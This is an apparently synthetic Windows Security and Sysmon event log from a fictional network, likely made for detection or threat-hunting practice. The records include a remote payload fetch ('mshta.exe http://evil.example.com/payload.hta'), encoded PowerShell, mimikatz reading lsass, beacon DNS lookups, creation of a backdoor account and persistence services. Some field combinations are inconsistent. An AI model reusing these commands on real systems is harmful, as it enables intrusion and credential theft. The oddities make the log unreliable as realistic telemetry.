<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:22:52.0000000Z" /><EventRecordID>1227</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-6984-3314-2294-1001</Data><Data Name="TargetUserName">t.miller</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">2</Data><Data Name="IpAddress">10.0.0.5</Data><Data Name="IpPort">6074</Data><Data Name="ProcessName">C:\Windows\System32\cmd.exe</Data><Data Name="WorkstationName">SRV-SQL01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4663</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:23:23.0000000Z" /><EventRecordID>1228</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserName">charlie</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="ObjectName">C:\Users\Public\Documents\exfil.zip</Data><Data Name="ObjectType">File</Data><Data Name="AccessList">%%4417
			%%4418</Data><Data Name="ProcessName">C:\Windows\System32\reg.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>10</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:23:30.0000000Z" /><EventRecordID>1229</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T14:23:30.0000000Z</Data><Data Name="SourceProcessId">48353</Data><Data Name="SourceImage">C:\Tools\mimikatz.exe</Data><Data Name="TargetProcessId">23107</Data><Data Name="TargetImage">C:\Windows\System32\lsass.exe</Data><Data Name="GrantedAccess">0x1410</Data><Data Name="CallTrace">C:\Windows\System32\ntdll.dll+0xd809</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>3</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:23:40.0000000Z" /><EventRecordID>1230</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T14:23:40.0000000Z</Data><Data Name="Image">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="User">CORP\alice</Data><Data Name="Protocol">tcp</Data><Data Name="SourceIp">10.0.2.99</Data><Data Name="SourcePort">34007</Data><Data Name="DestinationIp">10.0.1.12</Data><Data Name="DestinationPort">443</Data><Data Name="DestinationHostname">evil.example.com</Data><Data Name="Initiated">true</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4697</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:24:58.0000000Z" /><EventRecordID>1231</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserName">svc_sql</Data><Data Name="SubjectDomainName">.</Data><Data Name="ServiceName">Schedule</Data><Data Name="ServiceFileName">C:\Windows\System32\reg.exe</Data><Data Name="ServiceType">0x10</Data><Data Name="ServiceStartType">2</Data><Data Name="ServiceAccount">LocalSystem</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>10</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:25:13.0000000Z" /><EventRecordID>1232</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="UtcTime">2024-11-25T14:25:13.0000000Z</Data><Data Name="SourceProcessId">11276</Data><Data Name="SourceImage">C:\Tools\mimikatz.exe</Data><Data Name="TargetProcessId">18814</Data><Data Name="TargetImage">C:\Windows\System32\lsass.exe</Data><Data Name="GrantedAccess">0x1010</Data><Data Name="CallTrace">C:\Windows\System32\ntdll.dll+0x9581</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:25:21.0000000Z" /><EventRecordID>1233</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserName">t.miller</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="NewProcessId">0x3f06</Data><Data Name="NewProcessName">C:\Windows\System32\mshta.exe</Data><Data Name="CommandLine">wscript.exe C:\Users\Public\doc.vbs</Data><Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0xe28</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>12</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:25:48.0000000Z" /><EventRecordID>1234</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T14:25:48.0000000Z</Data><Data Name="EventType">DeleteKey</Data><Data Name="ProcessId">32287</Data><Data Name="Image">C:\Windows\System32\lsass.exe</Data><Data Name="TargetObject">HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Update</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:26:09.0000000Z" /><EventRecordID>1235</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserName">alice</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="NewProcessId">0x41d9</Data><Data Name="NewProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="CommandLine">powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0</Data><Data Name="ParentProcessName">C:\Windows\System32\svchost.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x551</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:26:10.0000000Z" /><EventRecordID>1236</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-4924-5623-3666-1001</Data><Data Name="TargetUserName">bob</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">198.51.100.23</Data><Data Name="IpPort">8001</Data><Data Name="ProcessName">C:\Windows\System32\powershell.exe</Data><Data Name="WorkstationName">DC02</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:26:29.0000000Z" /><EventRecordID>1237</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="SubjectUserName">alice</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="TargetUserName">svc_sql</Data><Data Name="TargetDomainName">CORP</Data><Data Name="TargetServerName">WKSTN-BOB</Data><Data Name="IpAddress">192.168.1.200</Data><Data Name="ProcessName">C:\Windows\SysWOW64\rundll32.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:26:31.0000000Z" /><EventRecordID>1238</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-1787-6154-2527-1001</Data><Data Name="TargetUserName">t.miller</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">172.16.5.10</Data><Data Name="IpPort">1579</Data><Data Name="ProcessName">C:\Windows\System32\svchost.exe</Data><Data Name="WorkstationName">LAPTOP-MGMT</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>12</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:26:42.0000000Z" /><EventRecordID>1239</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T14:26:42.0000000Z</Data><Data Name="EventType">DeleteKey</Data><Data Name="ProcessId">48558</Data><Data Name="Image">C:\Tools\mimikatz.exe</Data><Data Name="TargetObject">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\backdoor</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:26:46.0000000Z" /><EventRecordID>1240</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserName">SYSTEM</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="NewProcessId">0x1610</Data><Data Name="NewProcessName">C:\Windows\System32\powershell.exe</Data><Data Name="CommandLine">mshta.exe http://evil.example.com/payload.hta</Data><Data Name="ParentProcessName">C:\Windows\System32\reg.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0xa65</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>22</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:27:14.0000000Z" /><EventRecordID>1241</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T14:27:14.0000000Z</Data><Data Name="ProcessId">56838</Data><Data Name="Image">C:\Tools\mimikatz.exe</Data><Data Name="QueryName">beacon.attacker.top</Data><Data Name="QueryStatus">0</Data><Data Name="QueryResults">10.0.0.5</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:27:37.0000000Z" /><EventRecordID>1242</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserName">bob</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="NewProcessId">0xf268</Data><Data Name="NewProcessName">C:\Windows\System32\wscript.exe</Data><Data Name="CommandLine">svchost.exe -k netsvcs</Data><Data Name="ParentProcessName">C:\Windows\System32\powershell.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x473</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>22</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:27:43.0000000Z" /><EventRecordID>1243</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T14:27:43.0000000Z</Data><Data Name="ProcessId">64154</Data><Data Name="Image">C:\Windows\System32\regsvr32.exe</Data><Data Name="QueryName">www.microsoft.com</Data><Data Name="QueryStatus">0</Data><Data Name="QueryResults">198.51.100.23</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4768</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:27:55.0000000Z" /><EventRecordID>1244</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="TargetUserName">admin</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="ServiceName">krbtgt</Data><Data Name="IpAddress">::203.0.113.45</Data><Data Name="Status">0x0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>11</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:28:15.0000000Z" /><EventRecordID>1245</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T14:28:15.0000000Z</Data><Data Name="ProcessId">40772</Data><Data Name="Image">C:\Windows\System32\powershell.exe</Data><Data Name="TargetFilename">C:\Users\Public\Documents\exfil.zip</Data><Data Name="CreationUtcTime">2024-11-25T14:28:15.0000000Z</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:28:41.0000000Z" /><EventRecordID>1246</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-1244-3336-6071-1001</Data><Data Name="TargetUserName">t.miller</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">10.0.1.12</Data><Data Name="IpPort">57878</Data><Data Name="ProcessName">C:\Windows\System32\powershell.exe</Data><Data Name="WorkstationName">WKSTN-ALICE</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:28:56.0000000Z" /><EventRecordID>1247</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">john.doe</Data><Data Name="Workstation">WKSTN-CHARLIE</Data><Data Name="Status">0x0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:28:58.0000000Z" /><EventRecordID>1248</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">svc_sql</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">198.51.100.23</Data><Data Name="IpPort">5685</Data><Data Name="WorkstationName">DC02</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:29:06.0000000Z" /><EventRecordID>1249</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">svc_sql</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">203.0.113.45</Data><Data Name="IpPort">43641</Data><Data Name="WorkstationName">SRV-SQL01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:29:18.0000000Z" /><EventRecordID>1250</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-5696-7568-7701-1001</Data><Data Name="TargetUserName">t.miller</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">10.0.0.5</Data><Data Name="IpPort">61129</Data><Data Name="ProcessName">C:\Windows\System32\wscript.exe</Data><Data Name="WorkstationName">DC02</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4768</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:29:30.0000000Z" /><EventRecordID>1251</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="TargetUserName">jane.smith</Data><Data Name="TargetDomainName">CORP</Data><Data Name="ServiceName">krbtgt</Data><Data Name="IpAddress">::198.51.100.23</Data><Data Name="Status">0x18</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:29:41.0000000Z" /><EventRecordID>1252</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">svc_sql</Data><Data Name="Workstation">DC01</Data><Data Name="Status">0xC000006A</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>11</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:29:42.0000000Z" /><EventRecordID>1253</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="UtcTime">2024-11-25T14:29:42.0000000Z</Data><Data Name="ProcessId">11129</Data><Data Name="Image">C:\Users\alice\AppData\Roaming\implant.exe</Data><Data Name="TargetFilename">C:\Users\alice\Downloads\invoice_scan.pdf.exe</Data><Data Name="CreationUtcTime">2024-11-25T14:29:42.0000000Z</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:30:10.0000000Z" /><EventRecordID>1254</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-2195-4654-7360-1001</Data><Data Name="TargetUserName">SYSTEM</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">10.100.10.50</Data><Data Name="IpPort">44877</Data><Data Name="ProcessName">C:\Windows\System32\powershell.exe</Data><Data Name="WorkstationName">WKSTN-CHARLIE</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:30:13.0000000Z" /><EventRecordID>1255</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="SubjectUserName">john.doe</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="NewProcessId">0xcb55</Data><Data Name="NewProcessName">C:\Windows\System32\net.exe</Data><Data Name="CommandLine">C:\Windows\System32\cmd.exe /c copy \\10.0.1.12\admin$\mal.exe C:\temp</Data><Data Name="ParentProcessName">C:\Windows\System32\powershell.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x2bb</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4697</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:30:26.0000000Z" /><EventRecordID>1256</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserName">admin</Data><Data Name="SubjectDomainName">.</Data><Data Name="ServiceName">WinRM</Data><Data Name="ServiceFileName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="ServiceType">0x10</Data><Data Name="ServiceStartType">2</Data><Data Name="ServiceAccount">LocalSystem</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:30:35.0000000Z" /><EventRecordID>1257</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="SubjectUserName">john.doe</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="NewProcessId">0x19cc</Data><Data Name="NewProcessName">C:\Windows\System32\net.exe</Data><Data Name="CommandLine">net user backdoor P@ssw0rd123 /add</Data><Data Name="ParentProcessName">C:\Windows\System32\powershell.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x9b8</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:30:45.0000000Z" /><EventRecordID>1258</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">charlie</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">198.51.100.23</Data><Data Name="IpPort">3076</Data><Data Name="WorkstationName">SRV-SQL01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:30:52.0000000Z" /><EventRecordID>1259</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T14:30:52.0000000Z</Data><Data Name="ProcessGuid">{042C0-9358-32CF-1851A}</Data><Data Name="ProcessId">28716</Data><Data Name="Image">C:\Windows\System32\cmd.exe</Data><Data Name="CommandLine">mshta.exe http://evil.example.com/payload.hta</Data><Data Name="User">.\SYSTEM</Data><Data Name="ParentProcessId">4229</Data><Data Name="ParentImage">C:\Tools\mimikatz.exe</Data><Data Name="ParentCommandLine">powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0</Data><Data Name="Hashes">MD5=1a3d661543ef482416f6ba11aaa81e46,SHA256=6c91b2677ce3ea14fbcc5f4ccfc6afdfba2d53b663529073e7cd0cdf51e4726b</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Service Control Manager" /><EventID>7045</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:32:43.0000000Z" /><EventRecordID>1260</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>System</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="ServiceName">mal_persist</Data><Data Name="ImagePath">C:\Windows\System32\wscript.exe</Data><Data Name="ServiceType">user mode service</Data><Data Name="StartType">demand start</Data><Data Name="AccountName">LocalSystem</Data></EventData></Event>
